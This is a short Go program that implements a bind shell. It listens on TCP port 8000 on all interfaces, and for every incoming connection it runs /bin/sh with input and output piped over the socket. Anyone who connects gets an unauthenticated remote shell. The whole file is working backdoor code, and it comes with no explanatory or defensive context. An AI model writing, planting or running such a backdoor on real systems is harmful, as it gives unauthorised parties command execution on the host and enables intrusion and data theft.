package main

import (
	"log"
	"net"
	"os/exec"
)

func bindShell(network, address, shell string) {
	l, err := net.Listen(network, address)
	if err != nil {
		log.Fatalln(err)
	}
	defer l.Close()
	for {
		conn, _ := l.Accept()
		go func(conn net.Conn) {
			cmd := exec.Command(shell)
			cmd.Stdin = conn
			cmd.Stdout = conn
			cmd.Stderr = conn
			cmd.Run()
			defer conn.Close()
		}(conn)
	}
}

func main() {
	bindShell("tcp", ":8000", "/bin/sh")
}
